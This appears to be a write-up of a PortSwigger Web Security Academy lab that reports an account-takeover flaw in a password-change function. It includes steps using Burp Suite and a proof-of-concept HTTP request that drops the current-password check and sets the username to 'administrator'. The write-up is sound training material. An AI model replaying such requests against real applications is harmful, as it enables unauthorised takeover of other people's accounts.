🛡️ Vulnerability Report
Title
Account takeover via insecure password change functionality
port swiggers labs
Weak isolation on dual-use endpoint
________________________________________
Summary
The application allows users to change account passwords without verifying the current password. By manipulating the username parameter, an attacker can reset the password of any user, including the administrator, leading to full account takeover.
________________________________________
Steps to Reproduce
1.	Log in as a normal user (e.g., wiener) 
2.	Navigate to the password change functionality 
3.	Intercept the request using Burp Suite 
4.	Modify the request as follows: 
o	Remove the current-password parameter (if present) 
o	Change the username parameter to administrator 
5.	Send the modified request 
6.	Observe that the password is successfully changed without verification 
________________________________________
Proof of Concept
Request
POST /my-account/change-password HTTP/2
Host: 0afa00390482d2b6823e75fe000a00a3.web-security-academy.net
Cookie: session=UeniXKPJbTx2FxIBwP4SBY2CQyKtaIjr
Content-Type: application/x-www-form-urlencoded

csrf=Vx771eBMA0UKixi1aQUqoLORvjvlWkMk&username=administrator&new-password-1=peter3&new-password-2=peter3
-----------------------------------------------------
Response
HTTP/2 200 OK

Password changed successfully!
---------------------------------------------------
Impact
An attacker can reset the password of any user without knowing their current password. This leads to full account takeover, including administrative accounts, allowing unauthorized access to sensitive functionality and data.
---------------------------------------------------
Root Cause
The application fails to enforce proper validation in the password change process. Specifically:
•	The current password is not required or validated 
•	The server trusts user-controlled input (username) 
•	There is no authorization check to ensure the requester owns the account being modified 
This results in a broken access control vulnerability.

